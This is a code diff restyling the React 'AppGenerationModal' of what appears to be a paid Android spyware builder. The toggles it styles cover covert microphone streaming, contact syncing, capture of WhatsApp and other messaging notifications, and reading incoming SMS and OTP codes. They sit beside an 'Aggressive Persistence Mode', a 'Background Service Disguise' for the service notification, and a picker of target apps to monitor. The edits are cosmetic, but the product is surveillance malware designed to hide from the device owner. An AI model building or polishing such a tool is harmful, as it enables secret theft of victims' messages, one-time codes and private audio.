-                                                <span className="bg-gradient-to-r from-cyan-500/20 to-purple-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(6,182,212,0.2)]">
+                                                <span className="bg-purple-500/20 text-purple-300 border border-purple-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                     PREMIUM
                                                 </span>
                                             )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-fg-4 hover:text-emerald-400">
+                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-purple-400/70 hover:text-purple-300">
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-fg-3">Listen to live room surround audio</span>
+                                        <span className="text-xs text-purple-300/70">Room surround audio streaming</span>
                                     </div>
                                     <button
                                         type="button"
@@ -603,27 +662,27 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (!isPremium) { onUpgrade?.(); return; }
                                             setEnableMicrophonePermission(!enableMicrophonePermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* Contacts (PRO) */}
-                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${isBasicPlan ? 'border-amber-500/30' : 'border-white/10'}`}>
+                                {/* Contacts - Soft Green */}
+                                <div className={`p-4 rounded-2xl bg-green-500/10 border border-green-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(34,197,94,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-white">Contacts Sync</span>
+                                            <span className="text-sm font-bold text-green-200">Contacts Sync</span>
                                             {isBasicPlan && (
-                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
+                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                     PRO
                                                 </span>
                                             )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-fg-4 hover:text-green-400">
+                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-green-400/70 hover:text-green-300">
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-fg-3">Sync device phonebook & emails</span>
+                                        <span className="text-xs text-green-300/70">Sync phonebook & email addresses</span>
                                     </div>
                                     <button
                                         type="button"
@@ -637,21 +696,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
 
-                                {/* Notification Listener (PRO) */}
-                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${isBasicPlan ? 'border-amber-500/30' : 'border-white/10'}`}>
+                                {/* Notification Listener - Soft Sky */}
+                                <div className={`p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-white">Notification Reader</span>
+                                            <span className="text-sm font-bold text-sky-200">Notification Reader</span>
                                             {isBasicPlan && (
-                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
+                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                     PRO
                                                 </span>
                                             )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-fg-4 hover:text-cyan-400">
+                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-fg-3">Capture chat notifications</span>
+                                        <span className="text-xs text-sky-300/70">Capture WhatsApp & messaging alerts</span>
                                     </div>
                                     <button
                                         type="button"
@@ -659,30 +718,30 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (isBasicPlan) { onUpgrade?.(); return; }
                                             setEnableNotificationListener(!enableNotificationListener);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* SMS Access (Risky) */}
-                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${isBasicPlan ? 'border-amber-500/30' : 'border-red-500/30'}`}>
+                                {/* SMS Access - Soft Rose */}
+                                <div className={`p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(244,63,94,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-white">SMS Messages</span>
-                                            <span className="bg-red-500/20 text-red-400 border border-red-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
+                                            <span className="text-sm font-bold text-rose-200">SMS Messages</span>
+                                            <span className="bg-rose-500/20 text-rose-300 border border-rose-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
                                                 RISKY
                                             </span>
                                             {isBasicPlan && (
-                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
+                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                     PRO
                                                 </span>
                                             )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-fg-4 hover:text-blue-400">
+                                            <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-fg-3">Read SMS & OTP codes</span>
+                                        <span className="text-xs text-rose-300/70">Read incoming SMS & OTP codes</span>
                                     </div>
                                     <button
                                         type="button"
@@ -694,25 +753,25 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 setEnableSmsPermission(false);
                                             }
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
                             </div>
 
-                            {/* Aggressive Persistence Mode Card */}
-                            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-4">
+                            {/* Aggressive Persistence Mode Card - Soft Amber */}
+                            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-4 shadow-[0_4px_16px_rgba(245,158,11,0.1)]">
                                 <div>
                                     <div className="flex items-center gap-2">
-                                        <span className="text-sm font-bold text-amber-300">Aggressive Persistence Mode</span>
+                                        <span className="text-sm font-bold text-amber-200">Aggressive Persistence Mode</span>
                                         {isBasicPlan && (
-                                            <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
+                                            <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                 PRO
                                             </span>
                                         )}
                                     </div>
-                                    <p className="text-xs text-amber-200/70 mt-0.5">Keeps service alive aggressively against OS background optimization</p>
+                                    <p className="text-xs text-amber-300/70 mt-0.5">Prevents OS background optimization from terminating the service</p>
                                 </div>
                                 <button
                                     type="button"
@@ -732,10 +791,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {activeStep === 'notifications' && (
                         <div className="space-y-6 animate-in fade-in duration-200">
                             
-                            {/* Target Apps Selector ("notification add karna wala ka desigen better bana") */}
+                            {/* Colorful Soft UI Target Apps Selector */}
                             <div>
                                 <div className="flex items-center justify-between mb-2.5">
-                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest">Select Apps to Monitor</label>
+                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest">Monitored Target Apps</label>
                                     <span className="text-xs font-semibold text-emerald-400">{selectedTargetApps.length} active</span>
                                 </div>
                                 <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
@@ -748,29 +807,29 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 onClick={() => toggleTargetApp(app.id)}
                                                 className={`p-3.5 rounded-2xl border text-left flex items-center justify-between transition-all ${
                                                     isSelected
-                                                        ? `${app.color} shadow-md scale-[1.01]`
-                                                        : 'bg-black/30 border-white/5 hover:border-white/15 text-fg-3'
+                                                        ? `${app.color} scale-[1.01]`
+                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
                                                 }`}
                                             >
                                                 <div className="flex items-center gap-2.5 truncate">
                                                     <span className="text-lg">{app.icon}</span>
-                                                    <span className="text-xs font-bold truncate text-white">{app.name}</span>
+                                                    <span className="text-xs font-bold truncate">{app.name}</span>
                                                 </div>
-                                                {isSelected && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0" />}
+                                                {isSelected && <CheckCircle2 size={16} className="flex-shrink-0" />}
                                             </button>
                                         );
                                     })}
                                 </div>
                             </div>
 
-                            {/* Service Notification Disguise Preset */}
+                            {/* Foreground Service Disguise */}
                             <div className="space-y-4 pt-4 border-t border-white/10">
                                 <div>
                                     <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-1.5">Background Service Disguise</label>
                                     <select
                                         value={notificationStyle}
                                         onChange={(e) => setNotificationStyle(e.target.value)}
-                                        className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500 transition-colors"
+                                        className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                     >
                                         {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                             <option key={key} value={key} className="bg-[#18191c]">
@@ -782,7 +841,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                                 {/* Disguise Live Preview */}
                                 {notificationStyle !== 'custom' && (
-                                    <div className="bg-black/40 rounded-2xl p-4 border border-white/10 flex items-center gap-3">
+                                    <div className="bg-black/50 rounded-2xl p-4 border border-white/10 flex items-center gap-3 shadow-inner">
                                         <span className="text-2xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon}</span>
                                         <div>
                                             <p className="text-sm font-bold text-white">{NOTIFICATION_PRESETS[notificationStyle]?.title}</p>
@@ -793,7 +852,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                                 {/* Custom Notification Fields */}
                                 {notificationStyle === 'custom' && (
-                                    <div className="space-y-3 bg-black/40 p-4 rounded-2xl border border-white/10">
+                                    <div className="space-y-3 bg-black/50 p-4 rounded-2xl border border-white/10 shadow-inner">
                                         <div>
                                             <label className="block text-xs font-bold text-fg-3 mb-1">Custom Title</label>
                                             <input
@@ -822,11 +881,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 </div>
 
                 {/* Footer Controls & Progress Popup Overlay */}
-                <div className="p-5 sm:p-7 border-t border-white/10 bg-gradient-to-t from-white/[0.03] to-transparent flex flex-col gap-4">
+                <div className="p-5 sm:p-7 border-t border-white/10 bg-gradient-to-t from-white/[0.04] to-transparent flex flex-col gap-4">
                     
                     {/* Progress / Status Modal Popup Box */}
                     {status !== 'idle' && (
-                        <div className="p-5 rounded-2xl bg-black/70 border border-emerald-500/30 flex flex-col items-center justify-center text-center space-y-3 animate-in fade-in">
+                        <div className="p-5 rounded-2xl bg-black/80 border border-emerald-500/30 flex flex-col items-center justify-center text-center space-y-3 animate-in fade-in shadow-2xl">
                             {status === 'queued' ? (
                                 <>
                                     <div className="w-10 h-10 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin" />
